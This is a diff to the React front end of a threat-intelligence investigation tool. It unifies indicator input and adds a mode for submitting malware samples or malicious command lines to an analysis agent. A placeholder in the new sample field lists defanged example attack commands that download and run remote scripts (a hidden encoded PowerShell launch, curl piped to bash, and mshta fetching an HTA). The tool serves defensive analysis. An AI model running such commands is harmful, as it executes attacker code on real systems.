@@ -12,12 +12,13 @@ const NODE_COLORS = {
   domain: '#79c0ff', ip: '#ffa657', hash: '#d2a8ff', url: '#56d364',
   cert: '#3fb950', asn: '#e3b341', email: '#f78166', registrar: '#8b949e',
   ns: '#58a6ff', favicon: '#e3b341', jarm: '#bc8cff', report: '#f5a623',
-  country: '#ff7b72'
+  country: '#ff7b72', person: '#ff80b3', command_line: '#f0883e'
 }
 const NODE_SHAPES = {
   domain: 'ellipse', ip: 'rectangle', ns: 'diamond', registrar: 'hexagon',
   cert: 'round-rectangle', asn: 'barrel', hash: 'triangle', report: 'concave-hexagon',
-  jarm: 'pentagon', url: 'cut-rectangle', country: 'tag'
+  jarm: 'pentagon', url: 'cut-rectangle', country: 'tag', person: 'star',
+  command_line: 'rhomboid'
 }
 const STATUS_COLOR = { running: '#e3b341', done: '#56d364', cleared: '#8b949e',
                        error: '#f85149', quota_exceeded: '#d29922' }
@@ -53,6 +54,8 @@ const MALTEGO_TYPES = {
   favicon:   () => 'maltego.Phrase',
   jarm:      () => 'maltego.Phrase',
   country:   () => 'maltego.Location.Country',
+  person:    () => 'maltego.Person',
+  command_line: () => 'maltego.Phrase',
   report:    () => null,
 }
 
@@ -132,10 +135,6 @@ function detectIOCType(raw) {
   return 'domain'
 }
 
-const IOC_TYPE_LABEL = {
-  domain: 'Domain', ip: 'IP', hash: 'Hash', url: 'URL', jarm: 'JARM', asn: 'ASN'
-}
-
 // ── HighlightedText ──────────────────────────────────────────────────────────
 function HighlightedText({ text, nodeValues, onNodeClick }) {
   const str = typeof text === 'string' ? text : iocString(text)
@@ -164,11 +163,13 @@ function HighlightedText({ text, nodeValues, onNodeClick }) {
 }
 
 function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
-  const [seedType, setSeedType] = useState('auto')
-  const [seedValue, setSeedValue] = useState('')
-  // 'single' | 'batch' | 'pdf' — three ways to start an investigation.
-  const [inputMode, setInputMode] = useState('single')
-  const [batchText, setBatchText] = useState('')
+  // Unified IOC input — single textarea handles both single-IOC and multi-IOC
+  // input. The submit handler detects the line count and routes to the
+  // appropriate endpoint. Type is always auto-detected from the value.
+  const [seedText, setSeedText] = useState('')
+  // 'ioc' | 'pdf' — two ways to start an investigation. The IOC mode unifies
+  // what used to be 'single' and 'batch' (paste one IOC or a list, same input).
+  const [inputMode, setInputMode] = useState('ioc')
   const [model, setModel] = useState('sonnet')
   const [adminOpen, setAdminOpen] = useState(false)
   const [shareOpen, setShareOpen] = useState(false)
@@ -182,6 +183,14 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
   const [pdfError, setPdfError] = useState('')
   const pdfFileInputRef = useRef(null)
   const pdfAddSeedInputRef = useRef(null)
+  // 'Sample' mode: an uploaded malware sample / dropper / script OR a pasted
+  // command line. The two affordances live in the same tab; whichever one
+  // the analyst fills in wins (file > paste when both are provided).
+  const [sampleFile, setSampleFile] = useState(null)
+  const [sampleText, setSampleText] = useState('')
+  const [sampleBusy, setSampleBusy] = useState(false)
+  const [sampleError, setSampleError] = useState('')
+  const sampleFileInputRef = useRef(null)
   useEffect(() => { /* model-coercion */
     if (allowedModels && allowedModels.length && !allowedModels.includes(model)) {
       setModel(allowedModels[0])
@@ -247,7 +256,7 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
   const showNotesRef = useRef(true)
   const filterRelationsRef = useRef(filterRelations)
   // Add-seed form: attach a new PEER IOC to the currently open investigation.
-  const [addSeedType, setAddSeedType] = useState('auto')
+  // Type is always auto-detected — no override dropdown.
   const [addSeedValue, setAddSeedValue] = useState('')
   // Service-restart banner + reconnect state. `serverDown=true` means the
   // backend sent us a `server_shutdown` frame (e.g. `systemctl restart`); we
@@ -794,6 +803,7 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
     const v = String(n.value || '').toLowerCase()
     return v === 'working_hypothesis' || v.startsWith('working_hypothesis')
         || v.startsWith('budget_extension')
+        || v === 'lessons_learned'
   }
 
   const addCyNode = useCallback((n) => {
@@ -810,6 +820,15 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
           || (Array.isArray(md.file_names) && md.file_names[0])
           || md.meaningful_name
         if (name) return String(name)
+        return n.value.slice(0, 10) + '…'
+      }
+      if (n.type === 'command_line') {
+        // value is a 16-char sha256 prefix — useless as a label. Prefer
+        // metadata.preview (first line up to 80 chars) so the analyst sees
+        // what the snippet actually starts with on the graph.
+        const md = n.metadata || {}
+        const p = md.preview || md.file_name
+        if (p) return String(p)
         return n.value.slice(0, 10) + '…'
       }
       return n.value
@@ -1048,30 +1067,40 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
     ws.onerror = () => setEvents(e => ['__error__⚠ WS error', ...e])
   }, [handleEvent])
 
-  // ── start ─────────────────────────────────────────────────────────────────
-  const start = async () => {
-    const cleaned = refang(seedValue)
-    if (!cleaned) return
-    const effectiveType = seedType === 'auto' ? detectIOCType(cleaned) : seedType
-    const r = await fetch('/api/investigations', {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ seed_type: effectiveType, seed_value: cleaned, model })
-    })
-    const { id } = await r.json()
-    await refreshInvs()
-    openInv(id)
+  // Parse the seed textarea into a deduped list of refanged IOCs (the
+  // "list" can be one entry — that's the single-IOC case). One IOC per
+  // line OR comma-separated. Whitespace-only lines dropped.
+  const parseSeedInput = (raw) => {
+    const seen = new Set()
+    const out = []
+    for (const piece of (raw || '').split(/[\n,]+/)) {
+      const v = refang(piece).trim()
+      if (!v || seen.has(v)) continue
+      seen.add(v)
+      out.push(v)
+    }
+    return out
   }
 
-  // Launch a batch of investigations.
-  // combined=false → one investigation per IOC (parallel).
-  // combined=true  → single investigation graph with all IOCs as pivots (correlation mode).
-  const startBatch = async () => {
-    const items = batchText
-      .split(/[\n,]+/)
-      .map(s => refang(s))
-      .filter(Boolean)
-      .map(v => ({ seed_type: detectIOCType(v), seed_value: v }))
-    if (items.length === 0) return
+  // ── start ─────────────────────────────────────────────────────────────────
+  // Unified entrypoint: 0 IOCs → no-op, 1 IOC → /api/investigations, 2+ → batch.
+  // The combined toggle still gates batch graph topology (one graph vs many).
+  const start = async () => {
+    const values = parseSeedInput(seedText)
+    if (values.length === 0) return
+    if (values.length === 1) {
+      const cleaned = values[0]
+      const r = await fetch('/api/investigations', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ seed_type: detectIOCType(cleaned), seed_value: cleaned, model })
+      })
+      const { id } = await r.json()
+      await refreshInvs()
+      openInv(id)
+      setSeedText('')
+      return
+    }
+    const items = values.map(v => ({ seed_type: detectIOCType(v), seed_value: v }))
     const r = await fetch('/api/investigations/batch', {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ items, model, combined: batchCombined })
@@ -1080,7 +1109,7 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
     await refreshInvs()
     const first = (d.started || [])[0]
     if (first) openInv(first.id)
-    setBatchText('')
+    setSeedText('')
   }
 
   // ── PDF import ────────────────────────────────────────────────────────────
@@ -1110,6 +1139,43 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
       setPdfError(String(e.message || e).slice(0, 200))
     } finally {
       setPdfBusy(false)
+    }
+  }
+
+  // ── Sample / command-line import ───────────────────────────────────────
+  // Bootstrap an investigation from either an uploaded sample (binary or
+  // script — its sha256 becomes the seed) or a pasted command line / script
+  // (extracted IOCs become the seeds, the raw text becomes a command_line
+  // context node + report_context for the agent).
+  const startFromSample = async () => {
+    const text = sampleText.trim()
+    if (!sampleFile && !text) return
+    setSampleBusy(true); setSampleError('')
+    try {
+      const fd = new FormData()
+      if (sampleFile) fd.append('file', sampleFile)
+      if (text)       fd.append('text', text)
+      fd.append('model', model)
+      const r = await fetch('/api/investigations/from_sample', {
+        method: 'POST', body: fd, credentials: 'same-origin'
+      })
+      if (!r.ok) {
+        const t = await r.text(); throw new Error(t || `HTTP ${r.status}`)
+      }
+      const d = await r.json()
+      await refreshInvs()
+      openInv(d.id)
+      setSampleFile(null)
+      setSampleText('')
+      if (sampleFileInputRef.current) sampleFileInputRef.current.value = ''
+      const what = d.filename
+        ? `sample "${d.filename}" (${d.file_type})`
+        : 'pasted command'
+      setEvents(e => [`▶ ${what}: ${d.seeds_queued} seed(s) queued`, ...e])
+    } catch (e) {
+      setSampleError(String(e.message || e).slice(0, 200))
+    } finally {
+      setSampleBusy(false)
     }
   }
 
@@ -1247,7 +1313,7 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
     if (!activeInv) return
     const v = refang(addSeedValue)
     if (!v) return
-    const effectiveType = addSeedType === 'auto' ? detectIOCType(v) : addSeedType
+    const effectiveType = detectIOCType(v)
     await fetch(`/api/investigations/${activeInv}/add_seed`, {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ seed_type: effectiveType, seed_value: v, model })
@@ -1420,9 +1486,8 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
   const PIVOTABLE = ['domain', 'ip', 'hash', 'url', 'jarm', 'asn']
   const pivot = (n) => {
     if (!PIVOTABLE.includes(n.type)) return
-    setInputMode('single')
-    setSeedType(n.type)
-    setSeedValue(n.value)
+    setInputMode('ioc')
+    setSeedText(n.value)
   }
 
   // Pivot in-place: spawn another agent pass on the SAME investigation graph
@@ -1636,29 +1701,34 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
         <div className="logo-row"><img className="logo-mark logo-mark-sidebar" src="/logo-256.png" alt="" /><div className="logo">BOUNCE<span>CTI</span></div>{isAdmin && <button className="admin-btn" title="Admin panel" onClick={() => setAdminOpen(true)}>⚙</button>}<button className="logout-btn" title="Log out" onClick={onLogout}>⎋</button></div>
 
         <div className="section-label">New investigation</div>
-        {/* Segmented control: Single (one IOC) vs Batch (many IOCs) vs PDF
-            (upload an existing CTI report and let the agent read it). The
-            three input modes share the same Investigate CTA below. */}
+        {/* Segmented control:
+            - IOC: paste one or many indicators (auto-detected, auto-batched).
+            - Sample: upload an executable / dropper / archive OR paste a
+              command line / script — the agent hashes the binary, extracts
+              embedded IOCs, and reads the raw text as context.
+            - PDF: upload an existing CTI report and let the agent read it. */}
         <div className="seg-control seg-control-3" role="tablist" aria-label="Investigation mode">
           <button
             type="button"
             role="tab"
-            aria-selected={inputMode === 'single'}
-            className={`seg-option${inputMode === 'single' ? ' active' : ''}`}
-            onClick={() => setInputMode('single')}
+            aria-selected={inputMode === 'ioc'}
+            className={`seg-option${inputMode === 'ioc' ? ' active' : ''}`}
+            onClick={() => setInputMode('ioc')}
+            title="Paste a single IOC or a list — type is auto-detected"
           >
             <span className="seg-icon" aria-hidden="true">◆</span>
-            Single
+            IOC
           </button>
           <button
             type="button"
             role="tab"
-            aria-selected={inputMode === 'batch'}
-            className={`seg-option${inputMode === 'batch' ? ' active' : ''}`}
-            onClick={() => setInputMode('batch')}
+            aria-selected={inputMode === 'sample'}
+            className={`seg-option${inputMode === 'sample' ? ' active' : ''}`}
+            onClick={() => setInputMode('sample')}
+            title="Upload a malware sample / dropper / archive, or paste a malicious command line"
           >
-            <span className="seg-icon" aria-hidden="true">⧉</span>
-            Batch
+            <span className="seg-icon" aria-hidden="true">⚙</span>
+            Sample
           </button>
           <button
             type="button"
@@ -1672,55 +1742,43 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
             PDF
           </button>
         </div>
-        {inputMode === 'single' && (
-          <>
-            <div className="auto-detect-row">
-              <input
-                value={seedValue}
-                onChange={e => { setSeedValue(e.target.value); if (seedType === 'auto') { /* auto stays */ } }}
-                onKeyDown={e => e.key === 'Enter' && start()}
-                placeholder="Paste any IOC (defanged ok)"
+        {inputMode === 'ioc' && (() => {
+          const parsed = parseSeedInput(seedText)
+          const multi = parsed.length > 1
+          return (
+            <>
+              <textarea
+                className="batch-textarea"
+                value={seedText}
+                onChange={e => setSeedText(e.target.value)}
+                onKeyDown={e => {
+                  // Single-line input → Enter submits. Multi-line → keep newline
+                  // for additional IOCs; submit on Cmd/Ctrl+Enter.
+                  if (e.key === 'Enter' && !e.shiftKey && (!seedText.includes('\n') || e.metaKey || e.ctrlKey)) {
+                    e.preventDefault()
+                    start()
+                  }
+                }}
+                placeholder={`Paste one IOC, or a list (defanged ok — one per line or comma-separated):\nexample.com\n1.2.3.4\nhxxps://evil[.]com/path`}
+                rows={3}
               />
-              <span className="detected-type" title="Auto-detected type (click to override)">
-                {seedType === 'auto'
-                  ? (seedValue.trim() ? detectIOCType(seedValue) : '—').toUpperCase()
-                  : seedType.toUpperCase()}
-              </span>
-            </div>
-            <select value={seedType} onChange={e => setSeedType(e.target.value)} className="seed-type-override">
-              <option value="auto">Auto-detect</option>
-              <option value="domain">Domain</option>
-              <option value="ip">IP address</option>
-              <option value="hash">File hash</option>
-              <option value="url">URL</option>
-              <option value="jarm">JARM</option>
-              <option value="asn">ASN</option>
-            </select>
-          </>
-        )}
-        {inputMode === 'batch' && (
-          <>
-            <textarea
-              className="batch-textarea"
-              value={batchText}
-              onChange={e => setBatchText(e.target.value)}
-              placeholder={`Paste any IOCs, one per line (type auto-detected):\nexample.com\n1.2.3.4\nhxxps://evil[.]com/path\ne3b0c44298fc1c149afbf4c8996fb924…`}
-              rows={6}
-            />
-            <div className="batch-switch" title="Separate: one investigation per IOC. Combined: all IOCs on one graph to find cross-links.">
-              <span className={`batch-switch-label${!batchCombined ? ' active' : ''}`}>Separate</span>
-              <button
-                type="button"
-                className={`switch-track${batchCombined ? ' on' : ''}`}
-                onClick={() => setBatchCombined(v => !v)}
-                aria-label="Toggle combined mode"
-              >
-                <span className="switch-thumb" />
-              </button>
-              <span className={`batch-switch-label${batchCombined ? ' active' : ''}`}>Combined</span>
-            </div>
-          </>
-        )}
+              {multi && (
+                <div className="batch-switch" title="Separate: one investigation per IOC. Combined: all IOCs on one graph to find cross-links.">
+                  <span className={`batch-switch-label${!batchCombined ? ' active' : ''}`}>Separate</span>
+                  <button
+                    type="button"
+                    className={`switch-track${batchCombined ? ' on' : ''}`}
+                    onClick={() => setBatchCombined(v => !v)}
+                    aria-label="Toggle combined mode"
+                  >
+                    <span className="switch-thumb" />
+                  </button>
+                  <span className={`batch-switch-label${batchCombined ? ' active' : ''}`}>Combined</span>
+                </div>
+              )}
+            </>
+          )
+        })()}
         {inputMode === 'pdf' && (
           <div className="pdf-dropzone">
             <input
@@ -1753,6 +1811,50 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
             {pdfError && <div className="pdf-error">{pdfError}</div>}
           </div>
         )}
+        {inputMode === 'sample' && (
+          <div className="sample-pane">
+            <input
+              ref={sampleFileInputRef}
+              id="sample-file-input"
+              type="file"
+              onChange={e => {
+                setSampleFile(e.target.files?.[0] || null)
+                setSampleError('')
+              }}
+              hidden
+            />
+            <label htmlFor="sample-file-input" className="pdf-drop-target">
+              {sampleFile ? (
+                <>
+                  <span className="pdf-drop-icon" aria-hidden="true">⚙</span>
+                  <span className="pdf-drop-name" title={sampleFile.name}>
+                    {sampleFile.name.length > 38 ? sampleFile.name.slice(0, 36) + '…' : sampleFile.name}
+                  </span>
+                  <span className="pdf-drop-meta">
+                    {(sampleFile.size / 1024).toFixed(1)} KB · click to replace
+                  </span>
+                </>
+              ) : (
+                <>
+                  <span className="pdf-drop-icon" aria-hidden="true">⬆</span>
+                  <span className="pdf-drop-name">Drop an executable / dropper / archive</span>
+                  <span className="pdf-drop-meta">Hashed locally — file is not stored (max 25 MB)</span>
+                </>
+              )}
+            </label>
+            <div className="sample-or">or paste a command line / script</div>
+            <textarea
+              className="batch-textarea"
+              value={sampleText}
+              onChange={e => setSampleText(e.target.value)}
+              placeholder={'powershell -nop -w hidden -enc <base64>\ncurl http://evil[.]tld/x.sh | bash\nmshta hxxps://bad[.]site/p.hta'}
+              rows={4}
+              disabled={!!sampleFile}
+              title={sampleFile ? 'Clear the file selection to paste a command' : ''}
+            />
+            {sampleError && <div className="pdf-error">{sampleError}</div>}
+          </div>
+        )}
         <div className="section-label">Model</div>
         <select value={model} onChange={e => setModel(e.target.value)}>
           {(!allowedModels || allowedModels.includes('sonnet')) && <option value="sonnet">Sonnet 4.6 (recommended)</option>}
@@ -1762,15 +1864,25 @@ function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
         </select>
         <button
           onClick={
-            inputMode === 'pdf' ? startFromPdf
-              : inputMode === 'batch' ? startBatch
-              : start
+            inputMode === 'pdf'    ? startFromPdf
+            : inputMode === 'sample' ? startFromSample
+            : start
           }
-          disabled={inputMode === 'pdf' && (pdfBusy || !pdfFile)}
+          disabled={
+            (inputMode === 'pdf' && (pdfBusy || !pdfFile)) ||
+            (inputMode === 'sample' && (sampleBusy || (!sampleFile && !sampleText.trim()))) ||
+            (inputMode === 'ioc' && parseSeedInput(seedText).length === 0)
+          }
         >
           {inputMode === 'pdf'
             ? (pdfBusy ? 'Analyse du PDF…' : 'Importer le rapport →')
-            : inputMode === 'batch' ? 'Launch batch →' : 'Investigate →'}
+            : inputMode === 'sample'
+            ? (sampleBusy ? 'Hashing & extracting…' : (sampleFile ? 'Submit sample →' : 'Investigate command →'))
+            : (() => {
+                const n = parseSeedInput(seedText).length
+                if (n <= 1) return 'Investigate →'
+                return `Launch ${n} IOC${n > 1 ? 's' : ''} →`
+              })()}
         </button>
 
         <div className="section-label">History</div>
